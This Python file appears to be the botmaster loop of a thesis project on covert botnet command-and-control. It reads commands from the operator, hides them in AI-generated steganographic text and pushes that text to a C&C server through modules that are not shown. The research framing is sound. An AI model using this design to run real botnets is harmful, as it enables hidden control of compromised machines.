appHeader = """
#####################################################################
### ____  _  _   ___   __     _  _   __   ____  ____  ____  ____  ###
###(  _ \( \/ ) / __) / _\   ( \/ ) / _\ / ___)(_  _)(  __)(  _ \ ###
### ) _ (/ \/ \( (_ \/    \  / \/ \/    \ ___ \  )(   ) _)  )   / ###
###(____/\_)(_/ \___/\_/\_/  \_)(_/\_/\_/(____/ (__) (____)(__\_) ###
###---------------------------------------------------------------###
### A botmaster for researching hidden botnet communication       ###
### By using generative AI for creating steganographic stego-text ###
###---------------------------------------------------------------#############################################################
### I, Arnoud Stolk, explicitly declare that I bear no responsibility for the application or misapplication of this project.###
### This project has been developed solely for research purposes.                                                           ###
### The intention behind sharing this source code online is to supplement and support my thesis.                            ###
### Upon completion and evaluation, the thesis will be published on the associated GitHub page.                             ###
### For further information or inquiries, please visit https://github.com/arnoudx6/bmga.                                    ###
###############################################################################################################################
"""

#First print a the cool header also warning the user that I bear no responsiblilty for the abuse
print(appHeader)

#Import standard modules
import time
from loguru import logger

#Import custom modules
import shared_modules.c2 as c2Module
import shared_modules.stego as stegoModule

#Initialize script variables
keepBotmasterActive = True

#Get valid stego algorithms and make them uppercase
validStegoAlgorithms = stegoModule.getValidStegoAlgorithms()

logger.debug("Botmaster ready starting the command loop")

#This is an endless loop.
while keepBotmasterActive:
    logger.debug("Ready to process a new botnet command")

    #Ask for the stego-algorithm to use
    stegoAlgorithm = input("Enter a stego-algorithm {0}: ".format(validStegoAlgorithms)).upper()
    if not stegoAlgorithm or stegoAlgorithm not in validStegoAlgorithms:
        logger.error("Incorrect stego-algorithm entered")
        continue #<-- Go to the next loop itteration

    #Ask for cover context
    coverContextNeeded = stegoModule.isCoverContextNeeded(stegoAlgorithm=stegoAlgorithm)
    if coverContextNeeded:
        coverContext = input("Enter context for the cover: ")
        if not coverContext or coverContext == "":
            logger.error("No cover context provided")
            continue #<-- Go to the next loop itteration

    
    #Ask for the command to send
    commandToSend = input("Enter a command to send: ")
    if not commandToSend or commandToSend == "":
        logger.error("No command provided")
        continue #<-- Go to the next loop itteration

    #Ask for the name of the bot
    botName = input("Enter the name of the bot: ")
    if not botName:
        logger.error("No botname provided")
        continue #<-- Go to the next loop itteration

    #Write logs
    logger.debug("Selected stego-algorithm: {0}".format(stegoAlgorithm))
    logger.debug("Using context: {0} {1}".format(str(coverContextNeeded), coverContext))
    logger.debug("Entered command: {0}".format(commandToSend))

    ########Lookup table
    ########Put a lookup table here that can be used to transform the command
    embeddedText = commandToSend #<-- For now do this
    
    #Call the stego library and embed the embedded-text in a stego-text
    success, stegoText = stegoModule.embedEmbeddedTextInStegoText(stegoAlgorithm=stegoAlgorithm, embeddedText=embeddedText, coverContext=coverContext, botName=botName, stegoKey="blabla")
    if not success or not stegoText:
        logger.error("Error while embedding data")
        continue #<-- Go to the next loop itteration

    logger.debug("Stego-text: {0}".format(stegoText))

    #If we get here there is a stego-text. Now push the stego-text to the C&C.
    c2Module.push(stegoText=stegoText)


    logger.debug("End of command loop")
